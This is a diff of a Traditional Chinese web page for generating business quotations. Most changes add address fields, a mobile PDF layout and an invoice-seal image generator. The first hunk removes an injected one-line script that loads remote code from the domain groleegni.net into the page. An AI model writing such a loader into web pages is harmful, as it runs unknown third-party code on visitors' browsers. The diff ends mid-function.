@@ -40,7 +40,6 @@
         </script><!DOCTYPE html>
 <html lang="zh-TW">
 <head>
-<script>(function(d,z,s){s.src='https://'+d+'/401/'+z;try{(document.body||document.documentElement).appendChild(s)}catch(e){}})('groleegni.net',9263761,document.createElement('script'))</script>
     <!-- Google Tag Manager -->
     <script async src="https://www.googletagmanager.com/gtag/js?id=G-Q32FFR42XT"></script>
     <script>
@@ -370,19 +369,19 @@
         }
         .company-block .form-group label,
         .company-block .form-group p {
-            text-align: left; /* 靠左對齊 */
+            text-align: left;
         }
         .company-block .form-group p strong {
             display: inline-block;
-            width: 150px; /* 固定標籤寬度，確保對齊 */
+            width: 150px;
         }
         .info .form-group label,
         .info p {
-            text-align: left; /* 靠左對齊 */
+            text-align: left;
         }
         .info p strong {
             display: inline-block;
-            width: 150px; /* 固定標籤寬度，確保對齊 */
+            width: 150px;
         }
         .item-list {
             margin-bottom: 20px;
@@ -494,22 +493,22 @@
             padding-bottom: 5px;
         }
         #quotation-preview .company-block p {
-            text-align: left; /* 靠左對齊 */
+            text-align: left;
             margin: 5px 0;
             font-size: 16px;
         }
         #quotation-preview .company-block p strong {
             display: inline-block;
-            width: 150px; /* 固定標籤寬度，確保對齊 */
+            width: 150px;
         }
         #quotation-preview .info p {
-            text-align: left; /* 靠左對齊 */
+            text-align: left;
             margin: 5px 0;
             font-size: 16px;
         }
         #quotation-preview .info p strong {
             display: inline-block;
-            width: 150px; /* 固定標籤寬度，確保對齊 */
+            width: 150px;
         }
         #quotation-preview table {
             width: 100%;
@@ -527,7 +526,7 @@
             color: #ffffff;
         }
         #quotation-preview table td .currency-symbol {
-            padding-left: 5px; /* 貨幣符號稍微往左 */
+            padding-left: 5px;
         }
         #quotation-preview .total {
             font-size: 18px;
@@ -536,7 +535,7 @@
         }
         #quotation-preview .total .currency-symbol,
         #quotation-preview .tax .currency-symbol {
-            padding-left: 5px; /* 貨幣符號稍微往左 */
+            padding-left: 5px;
         }
         #quotation-preview .tax {
             font-size: 16px;
@@ -557,6 +556,9 @@
             border-radius: 6px;
             background-color: #f9f9f9;
             box-shadow: 0 1px 3px rgba(0,0,0,0.1);
+            display: flex;
+            flex-direction: column;
+            align-items: center;
         }
         #quotation-preview .signature p {
             margin: 0;
@@ -577,6 +579,9 @@
             max-width: 100px;
             max-height: 100px;
             margin-top: 10px;
+            display: block;
+            margin-left: auto;
+            margin-right: auto;
         }
         /* Facebook 留言板 */
         .facebook-comments {
@@ -636,11 +641,365 @@
                 flex-direction: column;
                 align-items: center;
             }
+            #quotation-preview {
+                display: none;
+            }
         }
         @media screen and (min-width: 769px) {
             .mobile-nav {
                 display: none;
             }
+            #quotation-preview-desktop {
+                display: none;
+            }
+        }
+        /* 桌面版佈局用於手機版截圖 */
+        #quotation-preview-desktop {
+            display: none;
+            max-width: 800px;
+            margin: 20px auto;
+            padding: 20px;
+            background-color: #ffffff;
+            border: 1px solid #D1D5DB;
+            border-radius: 8px;
+            box-shadow: 0 2px 5px rgba(0,0,0,0.1);
+            position: absolute;
+            top: -9999px;
+            left: -9999px;
+        }
+        #quotation-preview-desktop h2 {
+            font-size: 28px;
+            color: #2563eb;
+            text-align: center;
+            margin-bottom: 10px;
+        }
+        #quotation-preview-desktop .title-section {
+            margin-bottom: 20px;
+        }
+        #quotation-preview-desktop .title-section p {
+            font-size: 16px;
+            color: #333333;
+            margin: 5px 0;
+        }
+        #quotation-preview-desktop .number-align-left {
+            text-align: left;
+            margin-left: 0;
+        }
+        #quotation-preview-desktop .logo {
+            max-width: 150px;
+            max-height: 100px;
+            margin: 0 auto 20px;
+            display: block;
+        }
+        #quotation-preview-desktop .company-info {
+            display: flex;
+            gap: 20px;
+            margin-bottom: 20px;
+        }
+        #quotation-preview-desktop .company-block {
+            flex: 1;
+            padding: 15px;
+            border: 1px solid #D1D5DB;
+            border-radius: 6px;
+        }
+        #quotation-preview-desktop .company-block h3 {
+            font-size: 18px;
+            color: #2563eb;
+            margin-bottom: 15px;
+            border-bottom: 1px solid #D1D5DB;
+            padding-bottom: 5px;
+        }
+        #quotation-preview-desktop .company-block p {
+            text-align: left;
+            margin: 5px 0;
+            font-size: 16px;
+        }
+        #quotation-preview-desktop .company-block p strong {
+            display: inline-block;
+            width: 150px;
+        }
+        #quotation-preview-desktop .info p {
+            text-align: left;
+            margin: 5px 0;
+            font-size: 16px;
+        }
+        #quotation-preview-desktop .info p strong {
+            display: inline-block;
+            width: 150px;
+        }
+        #quotation-preview-desktop table {
+            width: 100%;
+            border-collapse: collapse;
+            margin-bottom: 20px;
+        }
+        #quotation-preview-desktop table th,
+        #quotation-preview-desktop table td {
+            padding: 10px;
+            border: 1px solid #D1D5DB;
+            text-align: left;
+        }
+        #quotation-preview-desktop table th {
+            background-color: #2563eb;
+            color: #ffffff;
+        }
+        #quotation-preview-desktop table td .currency-symbol {
+            padding-left: 5px;
+        }
+        #quotation-preview-desktop .total {
+            font-size: 18px;
+            font-weight: bold;
+            text-align: right;
+        }
+        #quotation-preview-desktop .total .currency-symbol,
+        #quotation-preview-desktop .tax .currency-symbol {
+            padding-left: 5px;
+        }
+        #quotation-preview-desktop .tax {
+            font-size: 16px;
+            text-align: right;
+            margin-bottom: 10px;
+        }
+        #quotation-preview-desktop .signature-section {
+            margin-top: 40px;
+            display: flex;
+            justify-content: flex-end;
+            align-items: center;
+            position: relative;
+        }
+        #quotation-preview-desktop .signature {
+            text-align: center;
+            padding: 10px;
+            border: 1px solid #D1D5DB;
+            border-radius: 6px;
+            background-color: #f9f9f9;
+            box-shadow: 0 1px 3px rgba(0,0,0,0.1);
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+        }
+        #quotation-preview-desktop .signature p {
+            margin: 0;
+            font-size: 16px;
+            font-weight: 500;
+            color: #A0A0A0;
+        }
+        #quotation-preview-desktop .signature .customer-signature {
+            border: none;
+            width: 200px;
+            margin-bottom: 15px;
+            padding-bottom: 5px;
+            border-bottom: 2px dashed #2563eb;
+            border-top: 2px dashed #2563eb;
+            padding-top: 5px;
+        }
+        #quotation-preview-desktop .signature .seal {
+            max-width: 100px;
+            max-height: 100px;
+            margin-top: 10px;
+            display: block;
+            margin-left: auto;
+            margin-right: auto;
+        }
+        /* 自動生成發票章按鈕 */
+        #generate-seal-btn {
+            background-color: #2563eb;
+            color: white;
+            border: none;
+            padding: 10px 20px;
+            border-radius: 6px;
+            cursor: pointer;
+            transition: background-color 0.2s ease;
+            margin-bottom: 10px;
+            display: block;
+        }
+        #generate-seal-btn:hover {
+            background-color: #1e40af;
+        }
+        /* 模態框樣式 */
+        .modal {
+            display: none;
+            position: fixed;
+            z-index: 1000;
+            left: 0;
+            top: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(0,0,0,0.5);
+            justify-content: center;
+            align-items: center;
+        }
+        .modal-content {
+            background-color: #ffffff;
+            padding: 20px;
+            border-radius: 8px;
+            width: 90%;
+            max-width: 500px;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.3);
+        }
+        .modal-content h2 {
+            font-size: 20px;
+            margin-bottom: 20px;
+            color: #2563eb;
+        }
+        .modal-content .form-group {
+            margin-bottom: 15px;
+        }
+        .modal-content .form-group label {
+            display: block;
+            margin-bottom: 5px;
+        }
+        .modal-content .form-group input,
+        .modal-content .form-group textarea {
+            width: 100%;
+            padding: 8px;
+            border: 1px solid #D1D5DB;
+            border-radius: 4px;
+            font-size: 14px;
+        }
+        .modal-content .modal-buttons {
+            display: flex;
+            justify-content: flex-end;
+            gap: 10px;
+        }
+        .modal-content .modal-buttons button {
+            padding: 10px 20px;
+            border: none;
+            border-radius: 4px;
+            cursor: pointer;
+            font-size: 14px;
+        }
+        .modal-content .modal-buttons .confirm-btn {
+            background-color: #2563eb;
+            color: white;
+        }
+        .modal-content .modal-buttons .confirm-btn:hover {
+            background-color: #1e40af;
+        }
+        .modal-content .modal-buttons .cancel-btn {
+            background-color: #EF4444;
+            color: white;
+        }
+        .modal-content .modal-buttons .cancel-btn:hover {
+            background-color: #DC2626;
+        }
+        /* 發票章生成區域（隱藏） */
+        #seal-preview {
+            display: none;
+            width: 200px;
+            height: 150px;
+            border: 2px solid #0000FF;
+            border-radius: 50% 50% 50% 50% / 20% 20% 20% 20%;
+            background-color: #ffffff;
+            color: #0000FF;
+            text-align: center;
+            font-family: 'Noto Sans TC', sans-serif;
+            position: absolute;
+            top: -9999px;
+            left: -9999px;
+            padding: 10px;
+            box-sizing: border-box;
+            overflow: hidden;
+        }
+        #seal-preview::before {
+            content: '';
+            position: absolute;
+            top: 30px;
+            left: 50%;
+            transform: translateX(-50%);
+            width: 80%;
+            height: 20px;
+            border-top: 1px solid #0000FF;
+            border-radius: 50% 50% 0 0 / 100% 100% 0 0;
+        }
+        #seal-preview::after {
+            content: '';
+            position: absolute;
+            bottom: 30px;
+            left: 50%;
+            transform: translateX(-50%);
+            width: 80%;
+            height: 20px;
+            border-bottom: 1px solid #0000FF;
+            border-radius: 0 0 50% 50% / 0 0 100% 100%;
+        }
+        #seal-preview .company-name {
+            font-size: 16px;
+            font-weight: bold;
+            margin-bottom: 5px;
+            position: absolute;
+            top: 10px;
+            width: 100%;
+            text-align: center;
+        }
+        #seal-preview .invoice-label {
+            font-size: 12px;
+            margin-bottom: 2px;
+            position: absolute;
+            top: 35px;
+            width: 100%;
+            text-align: center;
+        }
+        #seal-preview .tax-id-label {
+            font-size: 12px;
+            margin-bottom: 2px;
+            position: absolute;
+            top: 50px;
+            width: 100%;
+            text-align: center;
+        }
+        #seal-preview .tax-id {
+            font-size: 14px;
+            font-weight: bold;
+            margin-bottom: 5px;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            position: absolute;
+            top: 65px;
+            width: 100%;
+        }
+        #seal-preview .tax-id::before,
+        #seal-preview .tax-id::after {
+            content: url('img/plum_flower.jpg');
+            width: 10px;
+            height: 10px;
+            margin: 0 5px;
+        }
+        #seal-preview .details {
+            font-size: 10px;
+            line-height: 1.2;
+            position: absolute;
+            bottom: 35px;
+            width: 100%;
+            text-align: center;
+        }
+        #seal-preview .details div {
+            margin-bottom: 2px;
+        }
+        /* 說明區塊 */
+        .explanation-section {
+            width: 100%;
+            padding: 20px;
+            background-color: #ffffff;
+            border-radius: 8px;
+            box-shadow: 0 2px 5px rgba(0,0,0,0.1);
+            margin-bottom: 20px;
+        }
+        .explanation-section h2 {
+            font-size: 20px;
+            margin-bottom: 10px;
+            color: #2563eb;
+        }
+        .explanation-section p {
+            line-height: 1.6;
+            color: #666666;
+        }
+        .explanation-section img {
+            max-width: 100%;
+            height: auto;
+            border: 1px solid #D1D5DB;
+            border-radius: 6px;
+            margin-top: 10px;
         }
     </style>
 </head>
@@ -713,9 +1072,10 @@
                     <input type="file" id="logo-upload" accept="image/*">
                 </div>
                 <div class="form-group">
-                    <label for="seal-upload">上傳公司報價用印章</label>
+                    <label for="seal-upload">上傳公司報價發票章</label>
                     <input type="file" id="seal-upload" accept="image/*">
                 </div>
+                <button type="button" id="generate-seal-btn">自動生成發票章</button>
                 <div class="form-group">
                     <label for="quotation-title">報價單名稱</label>
                     <input type="text" id="quotation-title" placeholder="輸入報價單名稱，例如：感測器報價單">
@@ -732,7 +1092,7 @@
                             <input type="text" id="company-name" placeholder="輸入公司名稱或姓名">
                         </div>
                         <div class="form-group">
-                            <label for="company-tax-id">公司統一編號<span class="required-star">* </span></label>
+                            <label for="company-tax-id">公司統一編號</label>
                             <input type="text" id="company-tax-id" placeholder="輸入公司統一編號">
                         </div>
                         <div class="form-group">
@@ -743,6 +1103,10 @@
                             <label for="company-phone">公司電話<span class="required-star">* </span></label>
                             <input type="tel" id="company-phone" placeholder="輸入公司電話">
                         </div>
+                        <div class="form-group">
+                            <label for="company-address">地址</label>
+                            <input type="text" id="company-address" placeholder="輸入地址">
+                        </div>
                     </div>
                     <div class="company-block">
                         <h3>公司資訊（客戶方）</h3>
@@ -751,7 +1115,7 @@
                             <input type="text" id="client-name" placeholder="輸入公司名稱或姓名">
                         </div>
                         <div class="form-group">
-                            <label for="client-tax-id">公司統一編號<span class="required-star">* </span></label>
+                            <label for="client-tax-id">公司統一編號</label>
                             <input type="text" id="client-tax-id" placeholder="輸入公司統一編號">
                         </div>
                         <div class="form-group">
@@ -761,6 +1125,10 @@
                         <div class="form-group">
                             <label for="client-phone">公司電話<span class="required-star">* </span></label>
                             <input type="tel" id="client-phone" placeholder="輸入公司電話">
+                        </div>
+                        <div class="form-group">
+                            <label for="client-address">地址</label>
+                            <input type="text" id="client-address" placeholder="輸入地址">
                         </div>
                     </div>
                 </div>
@@ -822,7 +1190,7 @@
                 <button id="submit-btn" onclick="generateQuotation()">產生報價單</button>
             </div>
 
-            <!-- 報價單預覽 -->
+            <!-- 報價單預覽（桌面版顯示用） -->
             <div id="quotation-preview" style="display: none;">
                 <img id="preview-logo" class="logo" style="display: none;">
                 <div class="title-section">
@@ -836,6 +1204,7 @@
                         <p><strong>公司統一編號：</strong><span id="preview-company-tax-id"></span></p>
                         <p><strong>公司 Email：</strong><span id="preview-company-email"></span></p>
                         <p><strong>公司電話：</strong><span id="preview-company-phone"></span></p>
+                        <p><strong>地址：</strong><span id="preview-company-address"></span></p>
                     </div>
                     <div class="company-block">
                         <h3>公司資訊（客戶方）</h3>
@@ -843,6 +1212,7 @@
                         <p><strong>公司統一編號：</strong><span id="preview-client-tax-id"></span></p>
                         <p><strong>公司 Email：</strong><span id="preview-client-email"></span></p>
                         <p><strong>公司電話：</strong><span id="preview-client-phone"></span></p>
+                        <p><strong>地址：</strong><span id="preview-client-address"></span></p>
                     </div>
                 </div>
                 <div class="info">
@@ -877,6 +1247,80 @@
                     </div>
                 </div>
             </div>
+
+            <!-- 報價單預覽（手機版截圖用，桌面版佈局） -->
+            <div id="quotation-preview-desktop">
+                <img id="preview-logo-desktop" class="logo" style="display: none;">
+                <div class="title-section">
+                    <h2 id="preview-quotation-title-desktop">報價單</h2>
+                    <p class="number-align-left"><strong>報價單編號：</strong><span id="preview-quotation-number-desktop"></span></p>
+                </div>
+                <div class="company-info">
+                    <div class="company-block">
+                        <h3>公司資訊（報價方）</h3>
+                        <p><strong>公司名稱/姓名：</strong><span id="preview-company-name-desktop"></span></p>
+                        <p><strong>公司統一編號：</strong><span id="preview-company-tax-id-desktop"></span></p>
+                        <p><strong>公司 Email：</strong><span id="preview-company-email-desktop"></span></p>
+                        <p><strong>公司電話：</strong><span id="preview-company-phone-desktop"></span></p>
+                        <p><strong>地址：</strong><span id="preview-company-address-desktop"></span></p>
+                    </div>
+                    <div class="company-block">
+                        <h3>公司資訊（客戶方）</h3>
+                        <p><strong>公司名稱/姓名：</strong><span id="preview-client-name-desktop"></span></p>
+                        <p><strong>公司統一編號：</strong><span id="preview-client-tax-id-desktop"></span></p>
+                        <p><strong>公司 Email：</strong><span id="preview-client-email-desktop"></span></p>
+                        <p><strong>公司電話：</strong><span id="preview-client-phone-desktop"></span></p>
+                        <p><strong>地址：</strong><span id="preview-client-address-desktop"></span></p>
+                    </div>
+                </div>
+                <div class="info">
+                    <p><strong>報價日期：</strong><span id="preview-quotation-date-desktop"></span></p>
+                    <p><strong>報價單有效期限：</strong><span id="preview-valid-until-desktop"></span></p>
+                </div>
+                <table>
+                    <thead>
+                        <tr>
+                            <th>項目描述</th>
+                            <th>數量</th>
+                            <th>單價</th>
+                            <th>小計</th>
+                        </tr>
+                    </thead>
+                    <tbody id="preview-item-list-desktop"></tbody>
+                </table>
+                <div class="tax">
+                    <p>稅金（<span id="preview-tax-rate-desktop">0</span>%）：<span id="preview-tax-amount-desktop">0</span><span class="currency-symbol" id="tax-currency-symbol-desktop">NT$</span></p>
+                </div>
+                <div class="total">
+                    <p>總計（含稅）：<span id="preview-total-desktop">0</span><span class="currency-symbol" id="total-currency-symbol-desktop">NT$</span></p>
+                </div>
+                <div class="form-group">
+                    <label>備註/付款條件</label>
+                    <p id="preview-notes-desktop"></p>
+                </div>
+                <div class="signature-section">
+                    <div class="signature">
+                        <p class="customer-signature">顧客簽名</p>
+                        <img id="preview-seal-desktop" class="seal" style="display: none;">
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <!-- 說明區塊 -->
+        <div class="explanation-section">
+            <h2>報價單產生器使用說明</h2>
+            <p>請按照以下步驟使用報價單產生器：</p>
+            <ol>
+                <li>上傳公司 LOGO 和報價用發票章（或點擊「自動生成發票章」生成印章）。</li>
+                <li>填寫報價單名稱、編號和雙方公司資訊（報價方和客戶方）。</li>
+                <li>輸入項目清單，包括項目描述、數量和單價，並可新增或移除項目。</li>
+                <li>選擇報價日期、有效期限、計價幣別和稅率（若無稅金可留空）。</li>
+                <li>填寫備註或付款條件（可選）。</li>
+                <li>點擊「產生報價單」按鈕，系統將生成報價單預覽並自動下載為 PDF 檔案。</li>
+            </ol>
+            <p>以下是範例報價單，供您參考：</p>
+            <img src="img/quotation.jpg" alt="範例報價單">
         </div>
 
         <!-- Facebook 留言板 -->
@@ -889,6 +1333,50 @@
         <footer style="width: 100%;">
             <p>© 2025 <a href="https://www.youtube.com/@吉米理財學堂" target="_blank">吉米理財學堂</a>。保留所有權利。</p>
         </footer>
+
+        <!-- 模態框（輸入發票章資訊） -->
+        <div id="seal-modal" class="modal">
+            <div class="modal-content">
+                <h2>自動生成發票章</h2>
+                <div class="form-group">
+                    <label for="seal-company-name">公司名稱</label>
+                    <input type="text" id="seal-company-name" placeholder="輸入公司名稱">
+                </div>
+                <div class="form-group">
+                    <label for="seal-tax-id">統一編號</label>
+                    <input type="text" id="seal-tax-id" placeholder="輸入統一編號">
+                </div>
+                <div class="form-group">
+                    <label for="seal-representative">負責人</label>
+                    <input type="text" id="seal-representative" placeholder="輸入負責人姓名">
+                </div>
+                <div class="form-group">
+                    <label for="seal-phone">電話</label>
+                    <input type="tel" id="seal-phone" placeholder="輸入電話">
+                </div>
+                <div class="form-group">
+                    <label for="seal-address">地址</label>
+                    <input type="text" id="seal-address" placeholder="輸入地址">
+                </div>
+                <div class="modal-buttons">
+                    <button class="confirm-btn" onclick="generateSeal()">確認</button>
+                    <button class="cancel-btn" onclick="closeModal()">取消</button>
+                </div>
+            </div>
+        </div>
+
+        <!-- 發票章生成預覽（隱藏） -->
+        <div id="seal-preview">
+            <div class="company-name" id="seal-company-name-preview"></div>
+            <div class="invoice-label">統一發票專用章</div>
+            <div class="tax-id-label">統一編號</div>
+            <div class="tax-id" id="seal-tax-id-preview"></div>
+            <div class="details">
+                <div id="seal-representative-preview"></div>
+                <div id="seal-phone-preview"></div>
+                <div id="seal-address-preview"></div>
+            </div>
+        </div>
     </div>
 
     <script type="text/javascript">
@@ -980,6 +1468,64 @@
             }
         });
 
+        // 顯示模態框
+        document.getElementById('generate-seal-btn').addEventListener('click', function() {
+            document.getElementById('seal-modal').style.display = 'flex';
+        });
+
+        // 關閉模態框
+        function closeModal() {
+            document.getElementById('seal-modal').style.display = 'none';
+            document.getElementById('seal-company-name').value = '';
+            document.getElementById('seal-tax-id').value = '';
+            document.getElementById('seal-representative').value = '';
+            document.getElementById('seal-phone').value = '';
+            document.getElementById('seal-address').value = '';
+        }
+
+        // 生成發票章
+        function generateSeal() {
+            const companyName = document.getElementById('seal-company-name').value;
+            const taxId = document.getElementById('seal-tax-id').value;
+            const representative = document.getElementById('seal-representative').value;
+            const phone = document.getElementById('seal-phone').value;
+            const address = document.getElementById('seal-address').value;
+
+            if (!companyName || !taxId || !representative || !phone || !address) {
+                alert('請填寫所有欄位！');
+                return;
+            }
+
+            const sealPreview = document.getElementById('seal-preview');
+            document.getElementById('seal-company-name-preview').textContent = companyName;
+            document.getElementById('seal-tax-id-preview').textContent = taxId;
+            document.getElementById('seal-representative-preview').textContent = `負責人：${representative}`;
+            document.getElementById('seal-phone-preview').textContent = `電話：${phone}`;
+            document.getElementById('seal-address-preview').textContent = `地址：${address}`;
+
+            document.getElementById('company-name').value = companyName;
+            document.getElementById('company-tax-id').value = taxId;
+            document.getElementById('company-phone').value = phone;
+            document.getElementById('company-address').value = address;
+
+            html2canvas(sealPreview, {
+                scale: 2,
+                useCORS: true
+            }).then(canvas => {
+                sealUrl = canvas.toDataURL('image/jpeg');
+                const link = document.createElement('a');
+                link.href = sealUrl;
+                link.download = 'sample.jpg';
+                document.body.appendChild(link);
+                link.click();
+                document.body.removeChild(link);
+                closeModal();
+            }).catch(error => {
+                console.error('生成發票章失敗:', error);
+                alert('生成發票章失敗，請稍後再試！');
+            });
+        }
+
         // 生成報價單預覽並下載 PDF
         function generateQuotation() {
             const quotationTitle = document.getElementById('quotation-title').value || "報價單";
@@ -987,10 +1533,12 @@
             const companyTaxId = document.getElementById('company-tax-id').value;
             const companyEmail = document.getElementById('company-email').value;
             const companyPhone = document.getElementById('company-phone').value;
+            const companyAddress = document.getElementById('company-address').value;
             const clientName = document.getElementById('client-name').value;
             const clientTaxId = document.getElementById('client-tax-id').value;
             const clientEmail = document.getElementById('client-email').value;
             const clientPhone = document.getElementById('client-phone').value;
+            const clientAddress = document.getElementById('client-address').value;
             const quotationDate = document.getElementById('quotation-date').value;
             const validUntil = document.getElementById('valid-until').value;
             const quotationNumber = document.getElementById('quotation-number').value;
@@ -1002,9 +1550,8 @@
             const notes = document.getElementById('notes').value;
             const items = document.querySelectorAll('.item');
 
-            // 驗證必填欄位
-            if (!companyName || !companyTaxId || !companyEmail || !companyPhone || 
-                !clientName || !clientTaxId || !clientEmail || !clientPhone || 
+            if (!companyName || !companyEmail || !companyPhone || 
+                !clientName || !clientEmail || !clientPhone || 
                 !quotationDate || !validUntil || !quotationNumber) {
                 alert('請填寫所有必填欄位！');
                 return;
@@ -1021,42 +1568,64 @@
                 itemList.push({ 
                     description, 
                     quantity, 
-                    price: Math.round(price * 100) / 100, // 四捨五入到 2 位小數
-                    subtotal: Math.round(itemSubtotal * 100) / 100 // 四捨五入到 2 位小數
+                    price: Math.round(price * 100) / 100,
+                    subtotal: Math.round(itemSubtotal * 100) / 100
                 });
             });
 
-            // 計算稅金與總計，四捨五入到整數
-            const taxAmount = Math.round(subtotal * taxRate / 100); // 四捨五入到整數
-            const total = Math.round(subtotal + taxAmount); // 四捨五入到整數
-            const roundedTaxRate = Math.round(taxRate * 100) / 100; // 稅率保持 2 位小數
-
-            // 格式化報價日期為 YYYYMMDD
+            const taxAmount = Math.round(subtotal * taxRate / 100);
+            const total = Math.round(subtotal + taxAmount);
+            const roundedTaxRate = Math.round(taxRate * 100) / 100;
             const formattedDate = quotationDate.replace(/-/g, '');
 
-            // 更新預覽
             const preview = document.getElementById('quotation-preview');
+            const previewDesktop = document.getElementById('quotation-preview-desktop');
             const previewQuotationTitle = document.getElementById('preview-quotation-title');
+            const previewQuotationTitleDesktop = document.getElementById('preview-quotation-title-desktop');
             const previewLogo = document.getElementById('preview-logo');
+            const previewLogoDesktop = document.getElementById('preview-logo-desktop');
             const previewSeal = document.getElementById('preview-seal');
+            const previewSealDesktop = document.getElementById('preview-seal-desktop');
             const previewCompanyName = document.getElementById('preview-company-name');
+            const previewCompanyNameDesktop = document.getElementById('preview-company-name-desktop');
             const previewCompanyTaxId = document.getElementById('preview-company-tax-id');
+            const previewCompanyTaxIdDesktop = document.getElementById('preview-company-tax-id-desktop');
             const previewCompanyEmail = document.getElementById('preview-company-email');
+            const previewCompanyEmailDesktop = document.getElementById('preview-company-email-desktop');
             const previewCompanyPhone = document.getElementById('preview-company-phone');
+            const previewCompanyPhoneDesktop = document.getElementById('preview-company-phone-desktop');
+            const previewCompanyAddress = document.getElementById('preview-company-address');
+            const previewCompanyAddressDesktop = document.getElementById('preview-company-address-desktop');
             const previewClientName = document.getElementById('preview-client-name');
+            const previewClientNameDesktop = document.getElementById('preview-client-name-desktop');
             const previewClientTaxId = document.getElementById('preview-client-tax-id');
+            const previewClientTaxIdDesktop = document.getElementById('preview-client-tax-id-desktop');
             const previewClientEmail = document.getElementById('preview-client-email');
+            const previewClientEmailDesktop = document.getElementById('preview-client-email-desktop');
             const previewClientPhone = document.getElementById('preview-client-phone');
+            const previewClientPhoneDesktop = document.getElementById('preview-client-phone-desktop');
+            const previewClientAddress = document.getElementById('preview-client-address');
+            const previewClientAddressDesktop = document.getElementById('preview-client-address-desktop');
             const previewQuotationDate = document.getElementById('preview-quotation-date');
+            const previewQuotationDateDesktop = document.getElementById('preview-quotation-date-desktop');
             const previewValidUntil = document.getElementById('preview-valid-until');
+            const previewValidUntilDesktop = document.getElementById('preview-valid-until-desktop');
             const previewQuotationNumber = document.getElementById('preview-quotation-number');
+            const previewQuotationNumberDesktop = document.getElementById('preview-quotation-number-desktop');
             const previewItemList = document.getElementById('preview-item-list');
+            const previewItemListDesktop = document.getElementById('preview-item-list-desktop');
             const previewTaxRate = document.getElementById('preview-tax-rate');
+            const previewTaxRateDesktop = document.getElementById('preview-tax-rate-desktop');
             const previewTaxAmount = document.getElementById('preview-tax-amount');
+            const previewTaxAmountDesktop = document.getElementById('preview-tax-amount-desktop');
             const previewTotal = document.getElementById('preview-total');
+            const previewTotalDesktop = document.getElementById('preview-total-desktop');
             const previewTaxCurrencySymbol = document.getElementById('tax-currency-symbol');
+            const previewTaxCurrencySymbolDesktop = document.getElementById('tax-currency-symbol-desktop');
             const previewTotalCurrencySymbol = document.getElementById('total-currency-symbol');
+            const previewTotalCurrencySymbolDesktop = document.getElementById('total-currency-symbol-desktop');
             const previewNotes = document.getElementById('preview-notes');
+            const previewNotesDesktop = document.getElementById('preview-notes-desktop');
 
             previewQuotationTitle.textContent = quotationTitle;
             previewLogo.style.display = logoUrl ? 'block' : 'none';
@@ -1064,13 +1633,15 @@
             previewSeal.style.display = sealUrl ? 'block' : 'none';
             if (sealUrl) previewSeal.src = sealUrl;
             previewCompanyName.textContent = companyName;
-            previewCompanyTaxId.textContent = companyTaxId;
+            previewCompanyTaxId.textContent = companyTaxId || '未填寫';
             previewCompanyEmail.textContent = companyEmail;
             previewCompanyPhone.textContent = companyPhone;
+            previewCompanyAddress.textContent = companyAddress || '未填寫';
             previewClientName.textContent = clientName;
-            previewClientTaxId.textContent = clientTaxId;
+            previewClientTaxId.textContent = clientTaxId || '未填寫';
             previewClientEmail.textContent = clientEmail;
             previewClientPhone.textContent = clientPhone;
+            previewClientAddress.textContent = clientAddress || '未填寫';
             previewQuotationDate.textContent = quotationDate;
             previewValidUntil.textContent = validUntil;
             previewQuotationNumber.textContent = quotationNumber;
@@ -1086,19 +1657,73 @@
                 previewItemList.appendChild(row);
             });
             previewTaxRate.textContent = roundedTaxRate.toFixed(2);
-            previewTaxAmount.textContent = taxAmount; // 顯示整數
+            previewTaxAmount.textContent = taxAmount;
             previewTaxCurrencySymbol.textContent = currencySymbol;
-            previewTotal.textContent = total; // 顯示整數
+            previewTotal.textContent = total;
             previewTotalCurrencySymbol.textContent = currencySymbol;
             previewNotes.textContent = notes || '無';
 
-            preview.style.display = 'block';
+            previewQuotationTitleDesktop.textContent = quotationTitle;
+            previewLogoDesktop.style.display = logoUrl ? 'block' : 'none';
+            if (logoUrl) previewLogoDesktop.src = logoUrl;
+            previewSealDesktop.style.display = sealUrl ? 'block' : 'none';
+            if (sealUrl) previewSealDesktop.src = sealUrl;
+            previewCompanyNameDesktop.textContent = companyName;
+            previewCompanyTaxIdDesktop.textContent = companyTaxId || '未填寫';
+            previewCompanyEmailDesktop.textContent = companyEmail;
+            previewCompanyPhoneDesktop.textContent = companyPhone;
+            previewCompanyAddressDesktop.textContent = companyAddress || '未填寫';
+            previewClientNameDesktop.textContent = clientName;
+            previewClientTaxIdDesktop.textContent = clientTaxId || '未填寫';
+            previewClientEmailDesktop.textContent = clientEmail;
+            previewClientPhoneDesktop.textContent = clientPhone;
+            previewClientAddressDesktop.textContent = clientAddress || '未填寫';
+            previewQuotationDateDesktop.textContent = quotationDate;
+            previewValidUntilDesktop.textContent = validUntil;
+            previewQuotationNumberDesktop.textContent = quotationNumber;
+            previewItemListDesktop.innerHTML = '';
+            itemList.forEach(item => {
+                const row = document.createElement('tr');
+                row.innerHTML = `
+                    <td>${item.description || '未填寫'}</td>
+                    <td>${item.quantity}</td>
+                    <td>${item.price.toFixed(2)}<span class="currency-symbol">${currencySymbol}</span></td>
+                    <td>${item.subtotal.toFixed(2)}<span class="currency-symbol">${currencySymbol}</span></td>
+                `;
+                previewItemListDesktop.appendChild(row);
+            });
+            previewTaxRateDesktop.textContent = roundedTaxRate.toFixed(2);
+            previewTaxAmountDesktop.textContent = taxAmount;
+            previewTaxCurrencySymbolDesktop.textContent = currencySymbol;
+            previewTotalDesktop.textContent = total;
+            previewTotalCurrencySymbolDesktop.textContent = currencySymbol;
+            previewNotesDesktop.textContent = notes || '無';
 
-            // 使用 html2canvas 截圖並生成 PDF
+            const isMobile = window.innerWidth <= 768;
+            const targetElement = isMobile ? previewDesktop : preview;
+            
+            preview.style.display = isMobile ? 'none' : 'block';
+            if (isMobile) {
+                previewDesktop.style.display = 'block';
+                previewDesktop.style.position = 'absolute';
+                previewDesktop.style.top = '-9999px';
+                previewDesktop.style.left = '-9999px';
+            }
+
             setTimeout(() => {
-                html2canvas(document.getElementById('quotation-preview'), {
+                const boundingBox = targetElement.getBoundingClientRect();
+                const canvasWidth = 800;
+                const canvasHeight = targetElement.scrollHeight;
+
+                html2canvas(targetElement, {
                     scale: 2,
-                    useCORS: true
+                    useCORS: true,
+                    width: canvasWidth,
+                    height: canvasHeight,
+                    windowWidth: canvasWidth,
+                    windowHeight: canvasHeight,
+                    scrollX: 0,
+                    scrollY: 0
                 }).then(canvas => {
                     const imgData = canvas.toDataURL('image/png');
                     const { jsPDF } = window.jspdf;
@@ -1106,8 +1731,22 @@
                     const imgProps = pdf.getImageProperties(imgData);
